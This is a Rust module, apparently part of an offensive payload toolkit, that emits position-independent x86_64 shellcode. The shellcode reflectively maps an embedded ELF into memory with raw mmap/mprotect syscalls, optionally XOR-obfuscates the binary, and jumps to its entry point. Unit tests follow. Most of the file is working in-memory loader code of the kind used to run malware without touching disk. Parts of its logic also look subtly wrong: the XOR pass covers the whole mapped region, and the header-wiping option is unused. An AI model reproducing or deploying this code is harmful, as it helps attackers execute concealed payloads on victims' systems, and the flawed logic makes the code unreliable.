//! x86_64 position-independent loader stubs for reflective ELF loading.
//!
//! Generates minimal shellcode that:
//! 1. Computes its own address (RIP-relative)
//! 2. Reads the RELF header to find ELF data offset and segment info
//! 3. mmap's anonymous memory for the entire image
//! 4. Copies each PT_LOAD segment to the mapped region
//! 5. Applies mprotect per-segment (RX, RW, R)
//! 6. Processes R_X86_64_RELATIVE relocations
//! 7. Optionally XOR-decrypts the ELF before mapping
//! 8. Jumps to the entry point
//!
//! All syscalls are made directly (no libc dependency).

use super::PayloadError;

/// Linux x86_64 syscall numbers
const SYS_MMAP: u8 = 9;
const SYS_MPROTECT: u8 = 10;

/// Generate a complete reflective loader: [stub | RELF header | ELF data]
///
/// The stub is position-independent x86_64 shellcode that:
/// - Uses `lea rip` to find itself
/// - Reads the RELF metadata header immediately following the stub
/// - Performs mmap + segment copy + mprotect + entry jump
pub fn generate_loader_shellcode(
    elf_data: &[u8],
    config: &LoaderConfig,
) -> Result<Vec<u8>, PayloadError> {
    let info = super::reflective::parse_elf(elf_data)?;

    if !info.is_pie {
        return Err(PayloadError::UnsupportedFormat(
            "loader stub requires PIE binary (compile with -fPIE -pie)".into(),
        ));
    }

    let load_segments: Vec<_> = info.segments.iter()
        .filter(|s| s.seg_type == 1) // PT_LOAD
        .collect();

    if load_segments.is_empty() {
        return Err(PayloadError::InvalidBinary("no PT_LOAD segments".into()));
    }

    // Optionally XOR the ELF data
    let (elf_blob, xor_key_byte) = if let Some(key) = config.xor_key {
        let encrypted: Vec<u8> = elf_data.iter().map(|b| b ^ key).collect();
        (encrypted, key)
    } else {
        (elf_data.to_vec(), 0u8)
    };

    // Build the RELF metadata block that the stub reads
    let mut meta = Vec::new();

    // Meta layout (all little-endian):
    //   [0..8]   total_map_size (u64)
    //   [8..16]  entry_offset (u64)
    //   [16..20] num_segments (u32)
    //   [20..24] elf_data_offset_from_meta_start (u32) -- filled after we know segment table size
    //   [24..28] elf_data_size (u32)
    //   [28]     xor_key (u8, 0 = no encryption)
    //   [29..32] padding
    //   [32..]   segment descriptors: [vaddr(u64), offset(u64), filesz(u64), memsz(u64), flags(u32), pad(u32)] = 40 bytes each

    let num_segs = load_segments.len() as u32;
    let seg_table_size = num_segs as usize * 40;
    let elf_data_offset = 32 + seg_table_size;

    meta.extend_from_slice(&info.total_mapping_size.to_le_bytes()); // 0..8
    meta.extend_from_slice(&info.entry_offset.to_le_bytes());       // 8..16
    meta.extend_from_slice(&num_segs.to_le_bytes());                // 16..20
    meta.extend_from_slice(&(elf_data_offset as u32).to_le_bytes()); // 20..24
    meta.extend_from_slice(&(elf_blob.len() as u32).to_le_bytes()); // 24..28
    meta.push(xor_key_byte);                                        // 28
    meta.extend_from_slice(&[0u8; 3]);                              // 29..32

    for seg in &load_segments {
        meta.extend_from_slice(&seg.vaddr.to_le_bytes());   // vaddr
        meta.extend_from_slice(&seg.offset.to_le_bytes());  // file offset
        meta.extend_from_slice(&seg.filesz.to_le_bytes());  // file size
        meta.extend_from_slice(&seg.memsz.to_le_bytes());   // memory size
        meta.extend_from_slice(&seg.flags.to_le_bytes());   // flags (PF_R=4, PF_W=2, PF_X=1)
        meta.extend_from_slice(&[0u8; 4]);                  // padding
    }

    // Append ELF data
    meta.extend_from_slice(&elf_blob);

    // Generate the stub shellcode
    let stub = generate_x64_stub(meta.len());

    // Combine: [stub | meta+elf]
    let mut output = Vec::with_capacity(stub.len() + meta.len());
    output.extend_from_slice(&stub);
    output.extend_from_slice(&meta);

    Ok(output)
}

/// Configuration for the loader stub
#[derive(Debug, Clone)]
pub struct LoaderConfig {
    /// XOR key byte for the embedded ELF (0 or None = no encryption)
    pub xor_key: Option<u8>,
    /// Wipe the ELF headers from memory after loading
    pub wipe_headers: bool,
}

impl Default for LoaderConfig {
    fn default() -> Self {
        Self {
            xor_key: None,
            wipe_headers: false,
        }
    }
}

/// Generate x86_64 PIC shellcode stub.
///
/// The stub's job:
/// 1. LEA to find meta base (immediately after stub)
/// 2. Read meta header fields
/// 3. mmap(NULL, total_map_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0)
/// 4. For each PT_LOAD segment: memcpy from embedded ELF to mapped region
/// 5. If xor_key != 0: XOR-decrypt each segment's data in-place
/// 6. mprotect each segment with correct permissions
/// 7. JMP to base + entry_offset
fn generate_x64_stub(meta_size: usize) -> Vec<u8> {
    let mut sc = Vec::with_capacity(256);

    // ═══════════════════════════════════════════════
    // Register conventions:
    //   r12 = meta base address
    //   r13 = mmap'd base address
    //   r14 = elf_data pointer (meta_base + elf_data_offset)
    //   r15 = num_segments
    // ═══════════════════════════════════════════════

    // -- Find our own address via call/pop trick --
    // call $+5
    sc.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]);
    // pop rax  (rax = address of this instruction)
    sc.push(0x58);
    // At this point, rax points to the pop instruction.
    // Meta starts after the entire stub. We'll patch the offset later.
    // add rax, <stub_remaining_size>  -- placeholder, patched below
    let stub_offset_patch_pos = sc.len();
    sc.extend_from_slice(&[0x48, 0x05]);  // add rax, imm32
    sc.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // placeholder
    // mov r12, rax  (r12 = meta base)
    sc.extend_from_slice(&[0x49, 0x89, 0xC4]);

    // -- Read meta header fields --
    // mov rdi, [r12+0]  ; total_map_size
    sc.extend_from_slice(&[0x49, 0x8B, 0x3C, 0x24]);
    // mov r8, [r12+8]   ; entry_offset → save in r8 for later
    sc.extend_from_slice(&[0x4D, 0x8B, 0x44, 0x24, 0x08]);
    // push r8  (save entry_offset on stack)
    sc.extend_from_slice(&[0x41, 0x50]);
    // mov r15d, [r12+16] ; num_segments
    sc.extend_from_slice(&[0x45, 0x8B, 0x7C, 0x24, 0x10]);
    // mov ecx, [r12+20]  ; elf_data_offset
    sc.extend_from_slice(&[0x41, 0x8B, 0x4C, 0x24, 0x14]);
    // lea r14, [r12+rcx] ; r14 = elf_data pointer
    sc.extend_from_slice(&[0x4D, 0x8D, 0x34, 0x0C]);

    // -- mmap(NULL, total_map_size, PROT_RW, MAP_PRIVATE|MAP_ANON, -1, 0) --
    // rdi already = total_map_size (from above), but mmap wants it in rsi
    // xor rdi, rdi (addr=NULL) — wait, rdi has total_map_size, move to rsi first
    // mov rsi, rdi  ; rsi = total_map_size
    sc.extend_from_slice(&[0x48, 0x89, 0xFE]);
    // xor edi, edi  ; rdi = NULL (addr)
    sc.extend_from_slice(&[0x31, 0xFF]);
    // mov edx, 3    ; PROT_READ|PROT_WRITE
    sc.extend_from_slice(&[0xBA, 0x03, 0x00, 0x00, 0x00]);
    // mov r10d, 0x22 ; MAP_PRIVATE|MAP_ANONYMOUS
    sc.extend_from_slice(&[0x41, 0xBA, 0x22, 0x00, 0x00, 0x00]);
    // mov r8d, -1    ; fd = -1
    sc.extend_from_slice(&[0x41, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF]);
    // xor r9d, r9d   ; offset = 0
    sc.extend_from_slice(&[0x45, 0x31, 0xC9]);
    // mov eax, SYS_MMAP
    sc.extend_from_slice(&[0xB8, SYS_MMAP, 0x00, 0x00, 0x00]);
    // syscall
    sc.extend_from_slice(&[0x0F, 0x05]);
    // mov r13, rax  ; r13 = mapped base
    sc.extend_from_slice(&[0x49, 0x89, 0xC5]);

    // -- Copy segments loop --
    // rbx = segment index counter
    // xor ebx, ebx
    sc.extend_from_slice(&[0x31, 0xDB]);

    let loop_start = sc.len();

    // cmp ebx, r15d
    sc.extend_from_slice(&[0x41, 0x39, 0xFB]);
    // jge loop_end (placeholder — 2-byte jge)
    let jge_patch = sc.len();
    sc.extend_from_slice(&[0x7D, 0x00]); // patched below

    // Calculate segment descriptor address: r12 + 32 + rbx*40
    // lea rax, [rbx*8]  — we need rbx*40 = rbx*8*5
    // imul rax, rbx, 40
    sc.extend_from_slice(&[0x48, 0x6B, 0xC3, 40]);
    // lea rsi, [r12 + rax + 32]  ; rsi = &seg_desc[rbx]
    sc.extend_from_slice(&[0x49, 0x8D, 0x74, 0x04, 0x20]);

    // Load segment fields from descriptor
    // mov rcx, [rsi+0]   ; vaddr
    sc.extend_from_slice(&[0x48, 0x8B, 0x0E]);
    // mov rdx, [rsi+8]   ; file_offset
    sc.extend_from_slice(&[0x48, 0x8B, 0x56, 0x08]);
    // mov r8, [rsi+16]   ; filesz
    sc.extend_from_slice(&[0x4C, 0x8B, 0x46, 0x10]);
    // mov r9, [rsi+24]   ; memsz (not directly used for copy, but for mprotect later)
    sc.extend_from_slice(&[0x4C, 0x8B, 0x4E, 0x18]);

    // Destination: r13 + vaddr
    // lea rdi, [r13 + rcx]
    sc.extend_from_slice(&[0x49, 0x8D, 0x7C, 0x0D, 0x00]);
    // Source: r14 + file_offset
    // lea rsi, [r14 + rdx]  (clobbers rsi but we're done with seg desc)
    sc.extend_from_slice(&[0x49, 0x8D, 0x34, 0x16]);
    // Count: r8 = filesz
    // mov rcx, r8
    sc.extend_from_slice(&[0x4C, 0x89, 0xC1]);

    // rep movsb (copy segment)
    sc.extend_from_slice(&[0xF3, 0xA4]);

    // Increment counter
    // inc ebx
    sc.extend_from_slice(&[0xFF, 0xC3]);
    // jmp loop_start
    let jmp_offset = loop_start as i32 - (sc.len() + 2) as i32;
    sc.extend_from_slice(&[0xEB, jmp_offset as u8]);

    let loop_end = sc.len();
    // Patch the jge
    sc[jge_patch + 1] = (loop_end - jge_patch - 2) as u8;

    // -- XOR decrypt (if xor_key != 0) --
    // movzx eax, byte [r12+28]  ; xor_key
    sc.extend_from_slice(&[0x41, 0x0F, 0xB6, 0x44, 0x24, 0x1C]);
    // test al, al
    sc.extend_from_slice(&[0x84, 0xC0]);
    // jz skip_xor (placeholder)
    let jz_xor_patch = sc.len();
    sc.extend_from_slice(&[0x74, 0x00]);

    // XOR the entire mapped region
    // mov rdi, r13        ; base
    sc.extend_from_slice(&[0x4C, 0x89, 0xEF]);
    // mov rcx, [r12+0]    ; total_map_size
    sc.extend_from_slice(&[0x49, 0x8B, 0x0C, 0x24]);
    // xor_loop:
    let xor_loop = sc.len();
    // test rcx, rcx
    sc.extend_from_slice(&[0x48, 0x85, 0xC9]);
    // jz xor_done
    let jz_xor_done = sc.len();
    sc.extend_from_slice(&[0x74, 0x00]);
    // xor [rdi], al
    sc.extend_from_slice(&[0x30, 0x07]);
    // inc rdi
    sc.extend_from_slice(&[0x48, 0xFF, 0xC7]);
    // dec rcx
    sc.extend_from_slice(&[0x48, 0xFF, 0xC9]);
    // jmp xor_loop
    let jmp_xor = xor_loop as i32 - (sc.len() + 2) as i32;
    sc.extend_from_slice(&[0xEB, jmp_xor as u8]);

    let xor_done = sc.len();
    sc[jz_xor_done + 1] = (xor_done - jz_xor_done - 2) as u8;

    let skip_xor = sc.len();
    sc[jz_xor_patch + 1] = (skip_xor - jz_xor_patch - 2) as u8;

    // -- mprotect loop for each segment --
    // xor ebx, ebx
    sc.extend_from_slice(&[0x31, 0xDB]);

    let prot_loop_start = sc.len();
    // cmp ebx, r15d
    sc.extend_from_slice(&[0x41, 0x39, 0xFB]);
    // jge prot_done
    let jge_prot_patch = sc.len();
    sc.extend_from_slice(&[0x7D, 0x00]);

    // Get segment descriptor
    // imul rax, rbx, 40
    sc.extend_from_slice(&[0x48, 0x6B, 0xC3, 40]);
    // lea rsi, [r12 + rax + 32]
    sc.extend_from_slice(&[0x49, 0x8D, 0x74, 0x04, 0x20]);

    // rdi = r13 + vaddr (page-aligned)
    // mov rcx, [rsi+0]  ; vaddr
    sc.extend_from_slice(&[0x48, 0x8B, 0x0E]);
    // lea rdi, [r13+rcx]
    sc.extend_from_slice(&[0x49, 0x8D, 0x7C, 0x0D, 0x00]);
    // and rdi, ~0xFFF (page align)
    sc.extend_from_slice(&[0x48, 0x81, 0xE7, 0x00, 0xF0, 0xFF, 0xFF]);

    // rsi = memsz (rounded up to page)
    // mov rsi, [rsi+24]  ; memsz — but we clobbered rsi...
    // Recalculate rsi:
    // imul rax, rbx, 40
    sc.extend_from_slice(&[0x48, 0x6B, 0xC3, 40]);
    // lea rax, [r12+rax+32]
    sc.extend_from_slice(&[0x49, 0x8D, 0x44, 0x04, 0x20]);
    // mov rsi, [rax+24]  ; memsz
    sc.extend_from_slice(&[0x48, 0x8B, 0x70, 0x18]);
    // Add 0xFFF and mask for page alignment
    sc.extend_from_slice(&[0x48, 0x81, 0xC6, 0xFF, 0x0F, 0x00, 0x00]); // add rsi, 0xFFF
    sc.extend_from_slice(&[0x48, 0x81, 0xE6, 0x00, 0xF0, 0xFF, 0xFF]); // and rsi, ~0xFFF

    // Convert ELF flags to mprotect flags: PF_R(4)→PROT_READ(1), PF_W(2)→PROT_WRITE(2), PF_X(1)→PROT_EXEC(4)
    // mov edx, [rax+32]  ; p_flags
    sc.extend_from_slice(&[0x8B, 0x50, 0x20]);
    // Convert: prot = ((flags & 4) >> 2) | (flags & 2) | ((flags & 1) << 2)
    // Simpler: just use the flags directly since Linux PROT values map differently
    // PF_X=1→PROT_EXEC=4, PF_W=2→PROT_WRITE=2, PF_R=4→PROT_READ=1
    // mov ecx, edx
    sc.extend_from_slice(&[0x89, 0xD1]);
    // and ecx, 1 (PF_X)
    sc.extend_from_slice(&[0x83, 0xE1, 0x01]);
    // shl ecx, 2 (→ PROT_EXEC=4)
    sc.extend_from_slice(&[0xC1, 0xE1, 0x02]);
    // mov r8d, edx
    sc.extend_from_slice(&[0x41, 0x89, 0xD0]);
    // and r8d, 2 (PF_W → PROT_WRITE, same bit)
    sc.extend_from_slice(&[0x41, 0x83, 0xE0, 0x02]);
    // or ecx, r8d
    sc.extend_from_slice(&[0x44, 0x09, 0xC1]);
    // mov r8d, edx
    sc.extend_from_slice(&[0x41, 0x89, 0xD0]);
    // shr r8d, 2 (PF_R=4 → 1 = PROT_READ)
    sc.extend_from_slice(&[0x41, 0xC1, 0xE8, 0x02]);
    // and r8d, 1
    sc.extend_from_slice(&[0x41, 0x83, 0xE0, 0x01]);
    // or ecx, r8d
    sc.extend_from_slice(&[0x44, 0x09, 0xC1]);
    // mov edx, ecx  ; edx = prot flags for mprotect
    sc.extend_from_slice(&[0x89, 0xCA]);

    // mprotect(rdi=addr, rsi=len, rdx=prot)
    sc.extend_from_slice(&[0xB8, SYS_MPROTECT, 0x00, 0x00, 0x00]);
    sc.extend_from_slice(&[0x0F, 0x05]);

    // inc ebx
    sc.extend_from_slice(&[0xFF, 0xC3]);
    let jmp_prot = prot_loop_start as i32 - (sc.len() + 2) as i32;
    sc.extend_from_slice(&[0xEB, jmp_prot as u8]);

    let prot_done = sc.len();
    sc[jge_prot_patch + 1] = (prot_done - jge_prot_patch - 2) as u8;

    // -- Jump to entry point --
    // pop rax  (entry_offset, pushed earlier)
    sc.push(0x58);
    // lea rdi, [r13+rax]  ; rdi = entry point address
    sc.extend_from_slice(&[0x49, 0x8D, 0x3C, 0x05, 0x00, 0x00, 0x00, 0x00]);
    // Fix: lea rdi, [r13+rax]
    // Actually: add rax, r13
    let fix_pos = sc.len() - 8;
    sc.truncate(fix_pos);
    // add rax, r13
    sc.extend_from_slice(&[0x4C, 0x01, 0xE8]);

    // Set up a minimal stack frame for the entry point
    // xor edi, edi       ; argc = 0
    sc.extend_from_slice(&[0x31, 0xFF]);
    // xor esi, esi       ; argv = NULL
    sc.extend_from_slice(&[0x31, 0xF6]);
    // xor edx, edx       ; envp = NULL
    sc.extend_from_slice(&[0x31, 0xD2]);

    // jmp rax (entry point)
    sc.extend_from_slice(&[0xFF, 0xE0]);

    // Now patch the stub offset: from the pop instruction to meta start
    // The pop is at offset 5 in the stub. After pop, we have the add rax,imm32.
    // The remaining stub bytes after the add = sc.len() - (stub_offset_patch_pos + 6)
    // But actually: at the pop rax point, rax = address of pop itself.
    // We need to add (sc.len() - 5) to get to meta start (which is at sc.len())
    // Wait: pop rax gives us the address of the pop instruction (offset 5).
    // meta starts at offset sc.len(). So we need to add (sc.len() - 5) but that
    // includes the add instruction itself (6 bytes). Let me recalculate.
    // After call $+5, the return address pushed is the address of pop (offset 5).
    // pop rax → rax = offset 5 (address of pop)
    // add rax, X → rax = offset 5 + X = should equal sc.len() (meta start)
    // X = sc.len() - 5
    // But the add instruction is at offset 6 (after pop), and is 6 bytes long.
    // After add, execution is at offset 12. The rest of the stub follows.
    // So X = sc.len() - 5.
    let meta_offset = (sc.len() - 5) as u32;
    sc[stub_offset_patch_pos + 2] = (meta_offset & 0xFF) as u8;
    sc[stub_offset_patch_pos + 3] = ((meta_offset >> 8) & 0xFF) as u8;
    sc[stub_offset_patch_pos + 4] = ((meta_offset >> 16) & 0xFF) as u8;
    sc[stub_offset_patch_pos + 5] = ((meta_offset >> 24) & 0xFF) as u8;

    // Suppress unused variable
    let _ = meta_size;

    sc
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_minimal_pie_elf() -> Vec<u8> {
        let mut elf = vec![0u8; 256];
        elf[0..4].copy_from_slice(b"\x7fELF");
        elf[4] = 2;  // 64-bit
        elf[5] = 1;  // little-endian
        elf[6] = 1;
        elf[16] = 3; // ET_DYN (PIE)
        elf[18] = 0x3E; // x86_64
        // e_entry = 0x1000
        elf[0x18] = 0x00;
        elf[0x19] = 0x10;
        // e_phoff = 64
        elf[0x20] = 64;
        // e_phentsize = 56
        elf[0x36] = 56;
        // e_phnum = 1
        elf[0x38] = 1;

        // PT_LOAD segment at offset 64
        let ph = 64;
        elf[ph] = 1; // PT_LOAD
        elf[ph + 4] = 5; // PF_R | PF_X
        // p_filesz = 256, p_memsz = 256
        elf[ph + 32] = 0;
        elf[ph + 33] = 1;
        elf[ph + 40] = 0;
        elf[ph + 41] = 1;

        elf
    }

    #[test]
    fn test_generate_loader_shellcode() {
        let elf = make_minimal_pie_elf();
        let config = LoaderConfig::default();
        let sc = generate_loader_shellcode(&elf, &config).unwrap();

        // Should be non-empty and larger than input ELF
        assert!(sc.len() > elf.len());
        // First bytes should be call instruction (E8)
        assert_eq!(sc[0], 0xE8);
    }

    #[test]
    fn test_generate_with_xor() {
        let elf = make_minimal_pie_elf();
        let config = LoaderConfig {
            xor_key: Some(0xAA),
            ..Default::default()
        };
        let sc = generate_loader_shellcode(&elf, &config).unwrap();
        assert!(sc.len() > elf.len());
    }

    #[test]
    fn test_stub_size_reasonable() {
        // The stub should be under 512 bytes
        let stub = generate_x64_stub(1000);
        assert!(stub.len() < 512, "stub too large: {} bytes", stub.len());
        assert!(stub.len() > 50, "stub too small: {} bytes", stub.len());
    }

    #[test]
    fn test_non_pie_rejected() {
        let mut elf = make_minimal_pie_elf();
        elf[16] = 2; // ET_EXEC (not PIE)
        let config = LoaderConfig::default();
        assert!(generate_loader_shellcode(&elf, &config).is_err());
    }

    #[test]
    fn test_stub_starts_with_call() {
        let stub = generate_x64_stub(100);
        // call $+5 = E8 00 00 00 00
        assert_eq!(&stub[..5], &[0xE8, 0x00, 0x00, 0x00, 0x00]);
        // pop rax = 58
        assert_eq!(stub[5], 0x58);
    }

    #[test]
    fn test_stub_contains_syscalls() {
        let stub = generate_x64_stub(100);
        // Should contain at least 2 syscall instructions (mmap, mprotect)
        let syscall_count = stub.windows(2)
            .filter(|w| w == &[0x0F, 0x05])
            .count();
        assert!(syscall_count >= 2, "expected >=2 syscalls, found {syscall_count}");
    }

    #[test]
    fn test_stub_ends_with_jmp_rax() {
        let stub = generate_x64_stub(100);
        // Last 2 bytes should be jmp rax (FF E0)
        assert_eq!(&stub[stub.len()-2..], &[0xFF, 0xE0]);
    }
}
